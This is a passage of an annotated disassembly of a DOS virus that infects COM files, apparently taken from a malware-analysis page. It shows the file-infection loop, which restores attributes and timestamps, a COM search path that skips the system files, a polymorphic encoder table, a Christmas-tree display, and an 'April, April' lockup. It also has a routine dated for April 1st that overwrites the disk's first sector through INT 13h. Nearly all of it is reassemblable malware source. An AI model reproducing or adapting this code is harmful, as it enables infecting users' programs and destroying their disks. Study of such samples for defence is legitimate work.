      MOV    CX,[L06FF]             ;saved file time               ;0488 8B0EFF06
      MOV    AX,5701h               ;set file date/time            ;048C B80157
      INT    21h                                                         ;048F CD21
      JB     L0496                                                 ;-> error, exit  ;0491 7203
      POP    CX                                                          ;0493 59
      DEC    CX                                                          ;0494 49
      PUSH   CX                                                          ;0495 51

    ;<- EXIT
L0496:        MOV    AH,3Eh                                                ;close handle  ;0496 B43E
      INT    21h                                                         ;0498 CD21
      MOV    CL,[L054B]             ;file attribute                    ;049A 8A0E4B05
      DEC    BYTE PTR [L0561];attr change ptr                      ;049E FE0E6105
      JZ     L04A9                                                 ;-> changed  ;04A2 7405
      TEST   CL,07                                                       ;04A4 F6C107
      JZ     L04B8                                                 ;-> no attributes set ;04A7 740F

    ;<- restore attributes
L04A9:        CMP    CL,20h                                                ;R/O ?   ;04A9 80F920
      JZ     L04B8                                                 ;-> yes   ;04AC 740A
      MOV    DX,offset L0562        ;file name & path              ;04AE BA6205
      XOR    CH,CH                                                       ;04B1 32ED
      MOV    AX,4301h               ;set file attribute            ;04B3 B80143
      INT    21h                                                         ;04B6 CD21
L04B8:        JMP    L01B0                                                 ;-> next file  ;04B8 E9F5FC

;========================================
;             Compare current file name with [DI]
;----------------------------------------
L04BB:        MOV    SI,offset L0562        ;current file name             ;04BB BE6205
      MOV    CX,000Bh               ;file name length              ;04BE B90B00
      CLD                                                                ;04C1 FC
      REPZ   CMPSB                                                       ;04C2 F3 A6
      RET                                                                ;04C4 C3

      ;<------File search path
      db     '0123456789'                                               ;04C5 30 31 32 33 34 35 36 37 38 39
      db     '0123456789'                                               ;04CF 30 31 32 33 34 35 36 37 38 39
      db     '0123456789'                                               ;04D9 30 31 32 33 34 35 36 37 38 39
      db     '0123456789'                                               ;04E3 30 31 32 33 34 35 36 37 38 39
      db     '0123456789'                                               ;04ED 30 31 32 33 34 35 36 37 38 39
      db     '012345678'                                                ;04F7 30 31 32 33 34 35 36 37 38
      db     'C:\JEZYKI'                                                ;0500 43 3A 5C 4A 45 5A 59 4B 49
      db     'C:\PC'                                                     ;0509 43 3A 5C 50 43
      db     'D:\U'                                                      ;050E 44 3A 5C 55
      db     'C:'                                                        ;0512 43 3A
L0514         db     '\'                                                         ;0514 5C
L0515         db     '*.COM'                                                     ;0515 2A 2E 43 4F 4D

L051A         db     0                                                         ;051A 00

L051B         db     'PATH='                                                     ;051B 50 41 54 48 3D

L0520         db     'IBMBIO.COM',0                                             ;0520 49 42 4D 42 49 4F 2E 43 4F
 ;0529 4D 00
L052B         db     'IBMDOS.COM',0                                             ;052B 49 42 4D 44 4F 53 2E 43 4F
 ;0534 4D 00

      ;<----- virus DTA
L0536         db     3                                                           ;0536 03
      db     '????????COM'                                              ;0537 3F 3F 3F 3F 3F 3F 3F 3F
 ;053F 43 4F 4D
      db     0FFh,2                                                      ;0542 FF02
      db     0,0                                                         ;0544 0000
      db     0,0                                                         ;0546 0000
      db     0,0                                                         ;0548 0000
      db     0                                                           ;054A 00
L054B         db     20h                                                   ;attribute found ;054B 20
      db     00,60h                                                ;Time file was last wrt ;054C 00 60
      db     71h,0Eh                                               ;Date file was last wrt ;054E 71 0E
L0550         dw     62DBh                                                 ;File size low  ;0550 DB 62
L0552         dw     0                                                     ;File size high  ;0552 00 00

L0554         db     'COMMAND.COM',0                                            ;0554 43 4F 4D 4D 41 4E
 ;055A 44 2E 43 4F 4D 00

      db     0                                                     ;??? ;0560 00

L0561         db     1                                                     ;attr change ptr ;0561 01

L0562         db     'C:\COMMAND.COM',0,0                                      ;0562 43 3A 5C 43 4F 4D
 ;0568 4D 41 4E 44 2E 43
 ;056E 4F 4D 00 00
      db     'M',0,0,0                                                  ;0572 4D 00 00 00
      db     '.COM',0                                                   ;0576 2E 43 4F 4D 00
      db     'OhNo!'                                                     ;057B 4F 68 4E 6F 21
      db     'OhNo!'                                                     ;0580 4F 68 4E 6F 21
      db     'OhNo!'                                                     ;0585 4F 68 4E 6F 21
      db     'OhNo!'                                                     ;058A 4F 68 4E 6F 21
      db     'OhNo!'                                                     ;058F 4F 68 4E 6F 21
      db     'OhNo!'                                                     ;0594 4F 68 4E 6F 21
      db     'OhNo!'                                                     ;0599 4F 68 4E 6F 21
      db     'OhNo!'                                                     ;059E 4F 68 4E 6F 21
      db     'OhNo!'                                                     ;05A3 4F 68 4E 6F 21
      db     'OhNo!'                                                     ;05A8 4F 68 4E 6F 21
      db     'OhNo!'                                                     ;05AD 4F 68 4E 6F 21
      db     'OhNo!'                                                     ;05B2 4F 68 4E 6F 21
      db     'OhNo!'                                                     ;05B7 4F 68 4E 6F 21
      db     'OhNo!'                                                     ;05BC 4F 68 4E 6F 21

L05C1         dw     0565h                                                 ;end of directory path ;05C1 65 05

;========================================
;             Write [cx] spaces
;----------------------------------------
L05C3:        MOV    AL,20h                                                      ;05C3 B020
L05C5:        PUSH   AX                                                          ;05C5 50
      CALL   L0667                  ;Write as TTY                       ;05C6 E89E00
      POP    AX                                                          ;05C9 58
      LOOP   L05C5                                                       ;05CA E2F9
      RET                                                                ;05CC C3

;========================================
;             Write cr/lf
;----------------------------------------
L05CD:        MOV    AL,0Dh                 ;cr                                  ;05CD B00D
      CALL   L0667                  ;Write as TTY                       ;05CF E89500
      MOV    AL,0Ah                 ;lf                                  ;05D2 B00A
      JMP    L0667                  ;Write as TTY                       ;05D4 E99000

;================================================
;             Display Christmas Tree
;------------------------------------------------
L05D7:        MOV    CX,0027h                                                   ;05D7 B92700
      CALL   L05C3                  ;Write [cx] spaces                 ;05DA E8E6FF
      MOV    AL,0ADh                ;''                                 ;05DD B0AD
      CALL   L0667                  ;Write as TTY                       ;05DF E88500
      CALL   L05CD                  ;Write CR/LF                        ;05E2 E8E8FF
      MOV    BX,3                                                        ;05E5 BB0300
      MOV    DX,0026h                                                   ;05E8 BA2600
L05EB:        MOV    CX,DX                                                       ;05EB 8BCA
      CALL   L05C3                  ;Write [cx] spaces                 ;05ED E8D3FF
      MOV    CX,BX                                                       ;05F0 8BCB
      MOV    AL,2Ah                 ;'*'                                 ;05F2 B02A
      CALL   L05C5                  ;Write [al] [cx] times             ;05F4 E8CEFF
      CALL   L05CD                  ;Write CR/LF                        ;05F7 E8D3FF
      DEC    DX                                                          ;05FA 4A
      ADD    BX,2                                                        ;05FB 83C302
      CMP    BX,1Fh                                                      ;05FE 83FB1F
      JNZ    L05EB                                                       ;0601 75E8
      MOV    BX,3                                                        ;0603 BB0300
L0606:        MOV    CX,0026h                                                   ;0606 B92600
      CALL   L05C3                  ;Write [cx] spaces                 ;0609 E8B7FF
      MOV    CX,3                                                        ;060C B90300
      MOV    AL,0DBh                ;''                                 ;060F B0DB
      CALL   L05C5                  ;Write [al] [cx] times             ;0611 E8B1FF
      CALL   L05CD                  ;Write cr/lf                        ;0614 E8B6FF
      DEC    BX                                                          ;0617 4B
      JNZ    L0606                                                       ;0618 75EC
      MOV    CX,0050h                                                   ;061A B95000
      MOV    AL,0CDh                ;''                                 ;061D B0CD
      CALL   L05C5                  ;Write [al] [cx] times             ;061F E8A3FF
      MOV    CX,0013h                                                   ;0622 B91300
      CALL   L05C3                  ;Write [cx] spaces                 ;0625 E89BFF
      MOV    BX,offset L0674        ;text                               ;0628 BB7406
      CALL   L065A                  ;Display string                (first part) ;062B E82C00
      MOV    CX,001Dh                                                   ;062E B91D00
      CALL   L05C3                  ;Write [cx] spaces                 ;0631 E88FFF
      JMP    short L065A ;Display string (secnd part);0634 EB24
      NOP                                                                ;0636 90

;========================================================
;             Display 'April...' & lock
;--------------------------------------------------------
L0637:        CALL   L063A                                                       ;0637 E80000
L063A:        POP    BX                                                          ;063A 5B
      ADD    BX,0Dh                 ;L063A+0Dh=L0647                   ;063B 83C30D
      MOV    AX,CS                                                       ;063E 8CC8
      MOV    DS,AX                                                       ;0640 8ED8
      CALL   L065A                  ;Display string                     ;0642 E81500
L0645:        JMP    L0645                  ;lock computer                      ;0645 EBFE


L0647         db     'April, '                                                  ;0647 41 70 72 69 6C 2C 20
      db     'April '                                                   ;064E 41 70 72 69 6C 20
      db     '... ',7,0                                                 ;0654 2E 2E 2E 20 07 00

;========================================
;             Display string
;----------------------------------------
L065A:        mov    al,[bx]                                                     ;065A 8A07
      inc    bx                                                          ;065C 43
      OR     AL,AL                                                       ;065D 0AC0
      JZ     L0666                                                       ;065F 7405
      CALL   L0667                  ;Write as TTY                       ;0661 E80300
      JMP    L065A                                                       ;0664 EBF4
L0666:        RET                                                                ;0666 C3

;========================================
;             Write as TTY
;----------------------------------------
l0667:        PUSH   DX                                                          ;0667 52
      PUSH   CX                                                          ;0668 51
      PUSH   BX                                                          ;0669 53
      XOR    BH,BH                                                       ;066A 32FF
      MOV    AH,0Eh                                                      ;066C B40E
      INT    10h                                                         ;066E CD10
      POP    BX                                                          ;0670 5B
      POP    CX                                                          ;0671 59
      POP    DX                                                          ;0672 5A
      RET                                                                ;0673 C3

L0674         db     'Und er lebt '                                             ;0674 55 6E 64 20 65 72 20 6C
 ;067C 65 62 74 20
      db     'doch noch : '                                             ;0680 64 6F 63 68 20 6E 6F 63
 ;0688 68 20 3A 20
      db     'Der Tannenbaum !'                                        ;068C 44 65 72 20 54 61 6E 6E
 ;0696 65 6E 62 61 75 6D 20 21
      db     0Dh,0Ah,0                                                  ;069C 0D 0A 00

      db     'Frohe Weihnachten ...'                                    ;069F 46 72 6F 68 65 20 57 65
 ;06A7 69 68 6E 61 63 68 74 65
 ;06AF 6E 20 2E 2E 2E
      db     0Dh,0Ah,7,0                                                ;06B4 0D 0A 07 00

;========================================
;             Destruction (1st of April)
;----------------------------------------
L06B8:        xor    dh,dh                                                 ;head=0   ;06B8 32 F6
      mov    cx,0001h               ;track 0, sector 1             ;06BA B9 01 00
      MOV    BX,offset L0637        ;Display 'April...'&lock;06BD BB3706
      MOV    AX,0301h               ;write 1 sector                    ;06C0 B80103
      INT    13h                                                         ;06C3 CD13
      RET                                                                ;06C5 C3

;========================================
;             new int 24h routine
;----------------------------------------
L06C6:        MOV    AL,00                                                 ;ignore error  ;06C6 B000
      IRET                                                               ;06C8 CF

;========================================
;             Changable bytes of encoder procedure
;----------------------------------------
L06C9 db     05Eh,000h,00Fh,043h                                       ;06C9 5E 00 0F 43
      db     05Eh,030h,00Fh,043h                                       ;06CD 5E 30 0F 43
      db     05Eh,0D2h,007h,043h                                       ;06D1 5E D2 07 43
      db     076h,000h,00Ch,046h                                       ;06D5 76 00 0C 46
      db     076h,030h,00Ch,046h                                       ;06D9 76 30 0C 46
      db     076h,0D2h,004h,046h                                       ;06DD 76 D2 04 46
      db     07Eh,000h,00Dh,047h                                       ;06E1 7E 00 0D 47
      db     07Eh,030h,00Dh,047h                                       ;06E5 7E 30 0D 47
      db     07Eh,0D2h,005h,047h                                       ;06E9 7E D2 05 47

L06ED         db     28h,30h,0D2h                                               ;06ED 28 30 D2

;========================================
; Pattern to restore victim bytes
;----------------------------------------
L06F0: repz   movsb                                                       ;06F0 F3 A4
       mov    si,cx                                                       ;06F2 8B F1
       mov    di,cx                                                       ;06F4 8B F9
       retn                                                               ;06F6 C3

L06F7         dw     0703h                                                 ;saved victim length ;06F7 03 07
L06F9         dw     63DBh                                                 ;victim length+100h ;06F9 DB 63
L06FB         dw     03C6h                                                 ;saved virus length ;06FB C6 03
L06FD         dw     0603h                                                 ;virus length  ;06FD 03 06

L06FF         dw     6000h                                                 ;victim time  ;06FF 00 60
L0701         dw     0E71h                                                 ;victim date  ;0701 71 0E

L0703         label  byte                                                  ;disk buffer

;===============================================
;             Rest of victim code follow here
;             on the end follow first 1539 bytes
;             fom beginning of file
;-----------------------------------------------

cseg          ends
      end    L0100


</textarea></td></tr></table></body></html>
